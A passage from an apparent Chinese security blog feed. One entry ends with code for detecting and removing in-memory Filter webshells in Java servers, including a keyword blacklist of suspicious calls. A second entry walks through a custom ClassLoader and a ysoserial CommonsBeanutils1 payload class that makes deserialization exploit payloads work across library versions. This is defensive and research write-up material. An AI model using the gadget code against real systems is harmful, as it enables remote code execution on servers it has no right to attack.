start="4"><li>特殊classloader加载</li></ol><p>我们都知道Filter也是class，也是必定有特定的classloader加载。一般来说，正常的Filter都是由中间件的WebappClassLoader加载的。反序列化漏洞喜欢利用TemplatesImpl和bcel执行任意代码。所以这些class往往就是以下这两个：</p><ul><li>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader</li><li>com.sun.org.apache.bcel.internal.util.ClassLoader</li></ul><p>这个特征是一个特别可疑的点了。当然了，有的内存马还是比较狡猾的，它会注入class到当前线程中，然后实例化注入内存马。这个时候内存马就有可能不是上面两个classloader。</p><ol start="5"><li>对应的classloader路径下没有class文件</li></ol><p>所谓内存马就是代码驻留内存中，本地无对应的class文件。所以我们只要检测Filter对应的ClassLoader目录下是否存在class文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">classFileIsExists</span><span class="params">(Class clazz)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(clazz == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String className = clazz.getName();</span><br><span class="line">    String classNamePath = className.replace(<span class="string">"."</span>, <span class="string">"/"</span>) + <span class="string">".class"</span>;</span><br><span class="line">    URL is = clazz.getClassLoader().getResource(classNamePath);</span><br><span class="line">    <span class="keyword">if</span>(is == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>Filter的doFilter方法中有恶意代码</li></ol><p>我们可以把内存中所有的Filter的class dump出来，使用<code>fernflower</code>等反编译工具分析看看，是否存在恶意代码，比如调用了如下可疑的方法：</p><ul><li>java.lang.Runtime.getRuntime</li><li>defineClass</li><li>invoke</li><li>…</li></ul><p>不难分析，内存马的命门在于<code>5</code>和<code>6</code>。简单说就是Filter型内存马首先是一个Filter类，同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦。大致检查的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isMemshell</span><span class="params">(Class targetClass,<span class="keyword">byte</span>[] targetClassByte)</span></span>&#123;</span><br><span class="line">    ClassLoader classLoader = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(targetClass.getClassLoader() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        classLoader = targetClass.getClassLoader();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class clsFilter =  <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clsFilter = classLoader.loadClass(<span class="string">"javax.servlet.Filter"</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否是filter</span></span><br><span class="line">    <span class="keyword">if</span>(clsFilter != <span class="keyword">null</span> &amp;&amp; clsFilter.isAssignableFrom(targetClass))&#123;</span><br><span class="line">        <span class="comment">// class loader 是不是Templates或bcel</span></span><br><span class="line">        <span class="keyword">if</span>(classLoader.getClass().getName().contains(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader"</span>)</span><br><span class="line">                || classLoader.getClass().getName().contains(<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 是否存在ClassLoader的文件目录下存在对应的class文件</span></span><br><span class="line">        <span class="keyword">if</span>(classFileIsExists(targetClass))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// filter是否包含恶意代码。</span></span><br><span class="line">        String[] blacklist = <span class="keyword">new</span> String[]&#123;<span class="string">"getRuntime"</span>,<span class="string">"defineClass"</span>,<span class="string">"invoke"</span>&#125;;</span><br><span class="line">        String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte);</span><br><span class="line">        <span class="keyword">for</span>(String b:blacklist)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clsJavaCode.contains(b))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS: 本文讨论查杀的思路，给出的代码只是概念正面的伪装代码。完美的方案是将以上6点作为判断指标，并根据指标的重要性赋予不同权重。满足的条件越多越可能是内存马。</p><h2 id="0x04-内存马的查杀"><a href="#0x04-内存马的查杀" class="headerlink" title="0x04 内存马的查杀"></a>0x04 内存马的查杀</h2><p>内存马识别完成，接下来就是如何查杀了。</p><p>方法一： 清除内存马中的Filter的恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] killMemshell(Class clsMemshell,<span class="keyword">byte</span>[] byteMemshell) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    File file = <span class="keyword">new</span> File(String.format(<span class="string">"/tmp/%s.class"</span>,clsMemshell.getName()));</span><br><span class="line">    <span class="keyword">if</span>(file.exists())&#123;</span><br><span class="line">        file.delete();</span><br><span class="line">    &#125;</span><br><span class="line">    FileOutputStream fos  = <span class="keyword">new</span> FileOutputStream(file.getAbsoluteFile());</span><br><span class="line">    fos.write(byteMemshell);</span><br><span class="line">    fos.flush();</span><br><span class="line">    fos.close();</span><br><span class="line">    ClassPool cp = ClassPool.getDefault();</span><br><span class="line">    cp.insertClassPath(<span class="string">"/tmp/"</span>);</span><br><span class="line">    CtClass cc = cp.getCtClass(clsMemshell.getName());</span><br><span class="line">    CtMethod m = cc.getDeclaredMethod(<span class="string">"doFilter"</span>);</span><br><span class="line">    m.addLocalVariable(<span class="string">"elapsedTime"</span>, CtClass.longType);</span><br><span class="line">    <span class="comment">// 正确覆盖代码：</span></span><br><span class="line">    <span class="comment">// m.setBody("&#123;$3.doFilter($1,$2);&#125;");</span></span><br><span class="line">    <span class="comment">// 方便演示代码：</span></span><br><span class="line">    m.setBody(<span class="string">"&#123;$2.getWriter().write(\"Your memory horse has been killed by c0ny1\");&#125;"</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] byteCode = cc.toBytecode();</span><br><span class="line">    cc.detach();</span><br><span class="line">    <span class="keyword">return</span> byteCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法二： 模拟中间件注销Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反序列化执行代码反射获取到StandardContext</span></span><br><span class="line">Object standardContext = ...;</span><br><span class="line">Field _filterConfigs = standardContext.getClass().getDeclaredField(<span class="string">"filterConfigs"</span>);</span><br><span class="line">_filterConfigs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object filterConfigs = _filterConfigs.get(standardContext);</span><br><span class="line">Map&lt;String, ApplicationFilterConfig&gt; filterConfigMap = (Map&lt;String, ApplicationFilterConfig&gt;)filterConfigs;</span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;String, ApplicationFilterConfig&gt; map : filterConfigMap.entrySet())&#123;</span><br><span class="line">    String filterName = map.getKey();</span><br><span class="line">    ApplicationFilterConfig filterConfig = map.getValue();</span><br><span class="line">    Filter filterObject = filterConfig.getFilter();</span><br><span class="line">    <span class="comment">// 如果是内存马的filter名</span></span><br><span class="line">    <span class="keyword">if</span>(filterName.startsWith(<span class="string">"memshell"</span>))&#123;</span><br><span class="line">        SecurityUtil.remove(filterObject);</span><br><span class="line">        filterConfigMap.remove(filterName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两种方法各有优劣，第一种方法比较通用，直接适配所有中间件。但恶意Filter依然在，只是恶意代码被清除了。第二种方法比较优雅，恶意Filter会被清除掉。但每种中间件注销Filter的逻辑不尽相同，需要一一适配。为了方便演示我们选第一种。</p><h2 id="0x05-demo展示"><a href="#0x05-demo展示" class="headerlink" title="0x05 demo展示"></a>0x05 demo展示</h2><p>最后给大家展示下，我查杀demo的效果。</p><p><img src="/articles/2020/kill-java-web-filter-memshell/kill-java-filter-memshell-demo.gif" alt="查杀演示"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本文我们对Filter型内存马的识别与查杀做了细致的分析，其实Servlet型，拦截器型和Controller型的查杀方法也是万变不离其中，可如法炮制。但这样的思路无法查杀Agent型内存马，Agent型内存马查杀难点在“查”不在“杀”，具体的难点在那，又是如何解决呢？我会在后续的《查杀Java web Agent型内存马》中继续分享我的思考。</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw" target="_blank" rel="noopener">Tomcat源码调试笔记-看不见的shell</a></li><li><a href="https://www.cnblogs.com/rebeyond/p/9686213.html" target="_blank" rel="noopener">【原创】利用“进程注入”实现无文件不死webshell</a></li><li><a href="https://landgrey.me/blog/12/" target="_blank" rel="noopener">基于内存 Webshell 的无文件攻击技术研究</a></li><li><a href="https://xz.aliyun.com/t/7388" target="_blank" rel="noopener">基于tomcat的内存 Webshell 无文件攻击技术</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用自定义ClassLoader解决反序列化serialVesionUID不一致问题</title>
      <link href="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/"/>
      <url>/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p><code>serialVesionUid</code>不一致导致反序列化失败也算是Java反序列化漏洞利用比较常见的问题了。查了下资料，发现了各种各样的方法，但没有找到一种适合所有gadget的通用解决方案，为此我花了一些时间，算是找到了自己心中比较完美的解决方案：自定义ClassLoader。目前已经将其集成到ysoserial中，可完美解决各类gadget serialVesionUID不一致问题。</p><h2 id="0x02-各方案的优劣"><a href="#0x02-各方案的优劣" class="headerlink" title="0x02 各方案的优劣"></a>0x02 各方案的优劣</h2><p>在解决这个问题之前，我尝试的很多方法，简单说下它们各自能解决的问题和存在的缺陷。</p><p><strong>方案1:修改序列化byte数据</strong></p><p>该方法可解决序列化最终数据的serialVesionUID不一致，但无法解决Object的serialVesionUID不一致</p><p><strong>方案2:反射修改serialVesionUID</strong></p><p>可以解决1的缺陷，但无法解决Gadget依赖的class没有serialVesionUID属性的情况，因为反射只能修改Object的属性，不能添加。</p><p><strong>方案3:修改Class字节码，添加或修改serialVesionUID</strong></p><p>能解决Gadget直接依赖Class的serialVesionUID不一致问题，可弥补方案2的缺陷。但不好解决Gadget间接依赖class存在serialVesionUID不一致的情况。</p><p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/add-svuid-by-javassist.png" alt="通过javassist给class添加serialVesionUID"></p><p><strong>方案4:Hook ObjectStreamClass.getSerialVesionUID()</strong></p><p>该方法负责返回所有参与序列化Class的serialVesionUID，Hook它并修改返回值，可解决所有class的serialVesionUID不一致问题。但它无法解决Gadget依赖jar版本之间，class差异较大，属性类型不同的情况。因为serialVesionUID发生改变取决于两个因素：Class的属性和方法。如果属性类型改变了，单单只修改serialVesionUID是不够的。</p><p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/modify-svuid-by-hook-getserialversionuid.png" alt="Hook ObjectStreamClass.getSerialVesionUID()"></p><p><strong>方案5:URLClassLoader</strong></p><p>使用URLClassLoader动态引入依赖jar可以很好的解决以上方案的缺陷。只是用在该场景下有些费劲，原因有三：</p><blockquote><p>第一，不方便隔离依赖。包含serialVesionUID不一致class的jar（这里简称<code>不一致jar</code>）是需要被隔离的。由于URLClassLoader是双亲委派模式，存在被父ClassLoader中的同名Class覆盖的风险。</p></blockquote><blockquote><p>第二，不方便共享依赖。Gadget依赖的部分jar可能不存在serialVesionUID不一致问题（这里简称<code>可共用jar</code>），我们需要共享。</p></blockquote><blockquote><p>第三，不方便添加Class到ClassLoader中，URLClassLoader只提供添加jar的方法。</p></blockquote><h2 id="0x03-自定义ClassLoader解决方案"><a href="#0x03-自定义ClassLoader解决方案" class="headerlink" title="0x03 自定义ClassLoader解决方案"></a>0x03 自定义ClassLoader解决方案</h2><p>在我看来比较完美的方案不仅要解决以上方案的缺陷，还要能防止各种未知的”副作用”。使用ClassLoader来解决的思路肯定是没错,但我们需要结合解决serialVesionUID不一致问题这个场景量身设计一个ClassLoader，核心有两点：</p><ol><li>改双亲委派为当前ClassLoader优先，方便隔离不一致jar共享可共用jar</li><li>方便添加Class和Jar到ClassLoader中</li></ol><p><strong>那么自定义ClassLoader是如何解决serialVesionUID不一致问题的呢？</strong></p><p>自定义ClassLoader可以很方便地切换<code>不一致jar</code>为漏洞环境的对应版本，生成的发序列化数据自然不会存在serialVesionUID不一致问题。具体实现如下图，我们自定义ClassLoader包含了Gadget class和不一致jar。当Gadget class实例化生成序列化对象时，由于当前ClassLoader优先原则，存在不一致问题的class使用的是自定义ClassLoader加载的，实现隔离。而其他Class找不到，自然走双亲委派模式，去父ClassLoader中查找，实现共享。</p><p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/custom-classloader.png" alt="自定义ClassLoader示意图"></p><p>下面我们分别来实现。</p><h2 id="0x04-addClass-amp-amp-addJar"><a href="#0x04-addClass-amp-amp-addJar" class="headerlink" title="0x04 addClass &amp;&amp; addJar"></a>0x04 addClass &amp;&amp; addJar</h2><p>首先我们自定义的ClassLoader需要维护要一个装载Class的Map <code>classByteMap</code>,<code>类名</code>为<code>键</code>，<code>类文件byte数据</code>为<code>值</code>。方便后续添加和获取Class。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;String, <span class="keyword">byte</span>[]&gt; classByteMap = <span class="keyword">new</span> HashMap&lt;String,<span class="keyword">byte</span>[]&gt;();</span><br></pre></td></tr></table></figure><p>addClass方法，主要是为了方便我们我们把Gadget对应的class添加的自定义ClassLoader中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addClass</span><span class="params">(String className,<span class="keyword">byte</span>[] classByte)</span></span>&#123;</span><br><span class="line">    classByteMap.put(className,classByte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addJar方法，主要是为了方便把gadget的不一致jar快速添加到ClassLoader中。具体来说就是读取不一致jar中所有class的<code>class name</code>和<code>class byte</code>，存储到<code>classByteMap</code>中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readJar</span><span class="params">(JarFile jar)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    Enumeration&lt;JarEntry&gt; en = jar.entries();</span><br><span class="line">    <span class="comment">// 遍历jar文件所有实体</span></span><br><span class="line">    <span class="keyword">while</span> (en.hasMoreElements())&#123;</span><br><span class="line">        JarEntry je = en.nextElement();</span><br><span class="line">        String name = je.getName();</span><br><span class="line">        <span class="comment">// 只class文件进行处理</span></span><br><span class="line">        <span class="keyword">if</span> (name.endsWith(<span class="string">".class"</span>))&#123;</span><br><span class="line">            String clss = name.replace(<span class="string">".class"</span>, <span class="string">""</span>).replaceAll(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>.findLoadedClass(clss) != <span class="keyword">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">// 读取class的byte内容</span></span><br><span class="line">            InputStream input = jar.getInputStream(je);</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span> bufferSize = <span class="number">4096</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[bufferSize];</span><br><span class="line">            <span class="keyword">int</span> bytesNumRead = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((bytesNumRead = input.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, bytesNumRead);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] cc = baos.toByteArray();</span><br><span class="line">            input.close();</span><br><span class="line">            <span class="comment">// 将class name 和class byte存储到classByteMap</span></span><br><span class="line">            classByteMap.put(clss, cc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-改双亲委派为自定义ClassLoader优先"><a href="#0x05-改双亲委派为自定义ClassLoader优先" class="headerlink" title="0x05 改双亲委派为自定义ClassLoader优先"></a>0x05 改双亲委派为自定义ClassLoader优先</h2><p>要想打破双亲委派，我们需要重新loadClass方法,修改加载逻辑为优先使用自定义ClassLoader加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// 1. 检测自定ClassLoader缓存中有没有，有的话直接返回</span></span><br><span class="line">        Class clazz = cacheClass.get(name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> != clazz) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 2. 若缓存中没有，就从当前ClassLoader可加载的所有Class中找</span></span><br><span class="line">            clazz = findClass(name);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">null</span> != clazz) &#123;</span><br><span class="line">                cacheClass.put(name, clazz);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                clazz = <span class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="comment">// 3.当自定义ClassLoader中没有找到目标class，再调用系统默认的加载机制,走双亲委派模式</span></span><br><span class="line">            clazz = <span class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>findClass方法定义的是自定义ClassLoader查找Class的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">    <span class="comment">// 从classByteMap中获取</span></span><br><span class="line">    <span class="keyword">byte</span>[] result = classByteMap.get(name);</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="comment">// 没有找到则抛出对应异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 将一个字节数组转为Class对象</span></span><br><span class="line">        <span class="keyword">return</span> defineClass(name, result, <span class="number">0</span>, result.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-编写版本兼容gadget"><a href="#0x06-编写版本兼容gadget" class="headerlink" title="0x06 编写版本兼容gadget"></a>0x06 编写版本兼容gadget</h2><p>依然以ysoserial <code>CommonsBeanutils1</code>为例子。ysoserial中默认commons-beanutils是1.9.2版本，下面我们给它添加一个兼容1.8.3版本的<code>CommonsBeanutils1_183</code>。</p><p>通过对比1.9.2和1.8.3序列化数据，发现serialVesionUID不一致的只有<code>org.apache.commons.beanutils.BeanComparator</code>类，它在<code>commons-beanutils-&lt;version&gt;.jar</code>中，剩余的<code>commons-collections-3.1.jar</code>和<code>commons-logging-1.2.jar</code>为可共用jar。</p><p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/commons-beanutils-ser.png" alt="两个版本的依赖jar生成的序列化数据对比"></p><p>接着就可以编写代码，调用自定义ClassLoader SuidClassLoader来解决serialVesionUID不一致问题了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Dependencies</span>(&#123;<span class="string">"commons-beanutils:commons-beanutils:1.8.3"</span>, <span class="string">"commons-collections:commons-collections:3.1"</span>, <span class="string">"commons-logging:commons-logging:1.2"</span>&#125;)</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.FROHOFF,Authors.CONY1 &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsBeanutils1_183</span> <span class="keyword">extends</span> <span class="title">Object</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义ClassLoader对象</span></span><br><span class="line">        SuidClassLoader suidClassLoader = <span class="keyword">new</span> SuidClassLoader();</span><br><span class="line">        <span class="comment">// 将Gadget class添加到自定义ClassLoader中</span></span><br><span class="line">        suidClassLoader.addClass(CommonsBeanutils1.class.getName(),classAsBytes(CommonsBeanutils1.class));</span><br><span class="line">        <span class="comment">// 从资源目录读取commons-beanutils-1.8.3.jar的base64数据</span></span><br><span class="line">        InputStream is = CommonsBeanutils1_183.class.getClassLoader().getResourceAsStream(<span class="string">"commons-beanutils-1.8.3.txt"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] jarBytes = <span class="keyword">new</span> BASE64Decoder().decodeBuffer(CommonUtil.readStringFromInputStream(is));</span><br><span class="line">        <span class="comment">// 将Gadget不一致jar添加到自定义ClassLoader中</span></span><br><span class="line">        suidClassLoader.addJar(jarBytes);</span><br><span class="line">        Class clsGadget = suidClassLoader.loadClass(<span class="string">"ysoserial.payloads.CommonsBeanutils1"</span>);</span><br><span class="line">        <span class="comment">// 判断存在serialVesionUID不一致问题的class是否是由自定义ClassLoader加载的</span></span><br><span class="line">        <span class="keyword">if</span>(BeanComparator.class.getClassLoader().equals(suidClassLoader))&#123;</span><br><span class="line">            <span class="comment">// 使用自定义ClassLoader加载的Gadget class创建对象，调用其getObject构建序列化对象</span></span><br><span class="line">            Object objGadget = clsGadget.newInstance();</span><br><span class="line">            Method getObject = objGadget.getClass().getDeclaredMethod(<span class="string">"getObject"</span>,String.class);</span><br><span class="line">            Object objPayload = getObject.invoke(objGadget,command);</span><br><span class="line">            suidClassLoader.cleanLoader();</span><br><span class="line">            <span class="keyword">return</span> objPayload;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"Class is not SuidClassLoader loading, serialization failure!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(CommonsBeanutils1_183.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Weblogic 